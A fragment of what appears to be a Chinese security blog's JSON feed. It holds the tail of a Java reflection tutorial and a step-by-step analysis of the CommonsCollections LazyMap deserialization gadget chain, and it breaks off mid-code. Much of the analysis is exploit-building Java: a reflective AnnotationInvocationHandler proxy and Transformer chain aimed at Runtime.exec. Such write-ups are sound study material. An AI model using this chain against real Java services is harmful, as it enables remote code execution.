punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InstantiationException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IllegalAccessException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NoSuchMethodException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InvocationTargetException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\">// 获取 Person 类的 class 对象</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token class-name\">Class</span> aClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Test.Person\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>aClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">// 获取 Person 类所有的方法信息</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">Method</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> declaredMethods <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethods</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Method</span> m <span class=\"token operator\">:</span> declaredMethods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token comment\">// 获取 Person 类所有的成员变量信息</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">Field</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> declaredFields <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredFields</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Field</span> f <span class=\"token operator\">:</span> declaredFields<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token comment\">// 获取 Person 类所有的构造方法信息</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token class-name\">Constructor</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> declaredConstructors <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Constructor</span> c <span class=\"token operator\">:</span> declaredConstructors<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token comment\">// 使用 newInstance 创建对象</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token class-name\">Person</span> person <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Person</span><span class=\"token punctuation\">)</span>aClass<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">// 调用构造方法来创建对象</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token comment\">// 获取构造方法</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token class-name\">Constructor</span> declaredConstructors1 <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">// 创建对象</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token class-name\">Person</span> jx <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Person</span><span class=\"token punctuation\">)</span>declaredConstructors1<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"jx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>jx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p><em><strong>了解了反射的使用，但如果你想对反射掌握得更好，还需深入理解反射背后的底层实现原理。</strong></em></p>\n",
            "tags": [
                "网络安全",
                "JAVA安全",
                "JAVA基础"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/19/lazyMap%E9%93%BE/",
            "url": "http://zhyzhyzhy.cn/2022/10/19/lazyMap%E9%93%BE/",
            "title": "Java反序列化CommonsCollections篇(二)",
            "date_published": "2022-10-18T16:00:00.000Z",
            "content_html": "<h1 id=\"lazymap链条分析\"><a class=\"anchor\" href=\"#lazymap链条分析\">#</a> LazyMap 链条分析</h1>\n<blockquote>\n<p>上篇的文章分析的是国内安全人员找到的链，本篇分析一下 ysoserial 里的利用链</p>\n</blockquote>\n<pre><code>/*\n\tGadget chain:\n\t\tObjectInputStream.readObject()\n\t\t\tAnnotationInvocationHandler.readObject()\n\t\t\t\tMap(Proxy).entrySet()\n\t\t\t\t\tAnnotationInvocationHandler.invoke()\n\t\t\t\t\t\tLazyMap.get()\n\t\t\t\t\t\t\tChainedTransformer.transform()\n\t\t\t\t\t\t\t\tConstantTransformer.transform()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tClass.getMethod()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tRuntime.exec()\n\tRequires:\n\t\tcommons-collections\n */\n</code></pre>\n<h2 id=\"链条分析\"><a class=\"anchor\" href=\"#链条分析\">#</a> 链条分析</h2>\n<p>其实和后半段链是一样的，只是入口类不同，所以我们只要改变一下入口类。<br />\nysoserial 使用的是 LazyMap 作为入口类，它的 get 方法调用了 transform，并且 factory 是可控的</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> key<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token comment\">// create value for key if key is not currently in the map</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">.</span><span class=\"token function\">containsKey</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> factory<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            map<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">return</span> value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> map<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>所谓 LazyMap，意思就是这个 Map 中的键 / 值对一开始并不存在，当被调用到时才会创建，这样的解释初听上去是不是有点不可思议，这样的 LazyMap 有用吗？我们这样来理解：我们需要一个 Map，但是由于创建成员的方法很 “重”（比如数据库访问），或者我们只有在调用 get () 时才知道如何创建，或者 Map 中出现的可能性很多很多，我们无法在 get () 之前添加所有可能出现的键 / 值对，或者任何其它解释得通的原因，我们觉得没有必要去初始化一个 Map 而又希望它可以在必要时自动处理数据生成的话，LazyMap 就变得很有用了。</p>\n</blockquote>\n<p>不理解没关系，其实 LazyMap 本身的使用并不重要，重要的是 <em><strong>它的 get 方法调用了 transform，并且 factory 是可控的</strong></em></p>\n<h1 id=\"查找get的函数调用不同类的同名函数\"><a class=\"anchor\" href=\"#查找get的函数调用不同类的同名函数\">#</a> 查找 get 的函数调用（不同类的同名函数）</h1>\n<p>如果使用 idea 进行 find 的话会发现有很多的调用点，这里直接给到 ysoserial 作者给出的利用点，还是 TransformerMap 的利用类 AnnotationInvocationHandler</p>\n<h3 id=\"入口类分析\"><a class=\"anchor\" href=\"#入口类分析\">#</a> 入口类分析</h3>\n<p>AnnotationInvocationHandler 的 invoke 中 memberValues 调用了 get 方法，我们知道 memberValues 是可控的，并且本身继承类 InvocationHandler</p>\n<p><img data-src=\"https://s2.loli.net/2022/10/19/thzAVmfn7pEdCys.png\" alt=\"7.png\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">AnnotationInvocationHandler</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">InvocationHandler</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Serializable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">long</span> serialVersionUID <span class=\"token operator\">=</span> <span class=\"token number\">6182022883658399397L</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Annotation</span><span class=\"token punctuation\">></span></span> type<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> memberValues<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>所以我们知道，只要将 AnnotationInvocationHandler 作为动态代理的 InvocationHandler，并在其调用任意函数时，就会走到 invoke 中，就能调用到我们想要的 get 方法。</p>\n<h3 id=\"具体实现\"><a class=\"anchor\" href=\"#具体实现\">#</a> 具体实现</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 反射调用并创建实例</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> annotationInvocationHandler <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Constructor</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> annotationInvocationHandlerConstructor <span class=\"token operator\">=</span> annotationInvocationHandler<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        annotationInvocationHandlerConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 放入 lazyMap 并返回 InvocationHandler</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token class-name\">InvocationHandler</span> handler <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationHandler</span><span class=\"token punctuation\">)</span> annotationInvocationHandlerConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Override</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> lazyMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 进行动态代理</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 第一个参数是 loader–定义代理类的类加载器</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 第二个参数是 interfaces–代理类要实现的接口列表 </span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// 第三个参数是 h–将方法调用分派给的调用处理程序 </span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// 返回值： 具有代理类的指定调用处理程序的代理实例，该代理类由指定的类加载器定义，并实现指定的接口</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token class-name\">Map</span> o <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>现在已经得到了一个 annotationInvocationHandler 的动态代理，但是还有一个小问题，在 invoke 中有几个 if 和 swicth 需要注意。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 不能调用 equals 方法</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>     <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>member<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"equals\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> paramTypes<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            paramTypes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token function\">equalsImpl</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token comment\">// 必须是无参方法\t</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>paramTypes<span class=\"token punctuation\">.</span>length <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AssertionError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Too many parameters for an annotation method\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>member<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string\">\"toString\"</span><span class=\"token operator\">:</span> <span class=\"token comment\">// 不能是 toString</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">toStringImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string\">\"hashCode\"</span><span class=\"token operator\">:</span> <span class=\"token comment\">// 不能是 hashCode</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">hashCodeImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token string\">\"annotationType\"</span><span class=\"token operator\">:</span> <span class=\"token comment\">// 不能是 annotationType</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> type<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>只要满足以上条件，就能正常走到 get 方法<br />\n这里 ysoserial 的作者给出了一个，就是 AnnotationInvocationHandler 的 readObject 中的 entrySet 方法，就完美满足以上条件，其实用其他的只要能传入 Map 参数类型，并且能够控制，也是可以正常实现。</p>\n<h3 id=\"前半段链条\"><a class=\"anchor\" href=\"#前半段链条\">#</a> 前半段链条</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> annotationInvocationHandler <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Constructor</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> annotationInvocationHandlerConstructor <span class=\"token operator\">=</span> annotationInvocationHandler<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        annotationInvocationHandlerConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">InvocationHandler</span> handler <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationHandler</span><span class=\"token punctuation\">)</span> annotationInvocationHandlerConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Override</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> lazyMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token class-name\">Map</span> o <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">InvocationHandler</span> o1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationHandler</span><span class=\"token punctuation\">)</span> annotationInvocationHandlerConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Override</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><hr />\n<p>现在只要实例化 o1 就能走到 get 方法，从而执行后半条链。</p>\n<hr />\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> map <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformedMaps <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token 